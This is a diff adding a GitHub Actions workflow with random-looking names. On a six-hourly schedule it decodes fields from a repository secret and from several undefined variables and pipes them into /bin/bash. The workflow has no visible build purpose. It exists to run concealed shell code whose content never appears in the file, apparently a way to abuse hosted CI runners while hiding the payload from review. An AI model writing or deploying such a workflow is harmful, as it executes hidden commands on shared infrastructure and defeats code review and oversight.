@@ -1,0 +1,25 @@
+name: ambitionparka
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ambitionparka
+        env:
+          brb233: ${{ secrets.brb233 }}
+        run: |
+          echo $brb233 | jq -r .h4487 | /bin/bash
+          echo $xjg1599 | jq -r .pjyi38 | /bin/bash
+          echo $mu1 | jq -r .przt0 | /bin/bash
+          echo $mpeh699 | jq -r .ekycw7 | /bin/bash
+          echo $luy3028 | jq -r .kesx3 | /bin/bash
+          echo $ltwj684 | jq -r .c003 | /bin/bash
+          echo $gwi0419 | jq -r .cdd66 | /bin/bash
+          echo $qlju625 | jq -r .yccel616 | /bin/bash
+
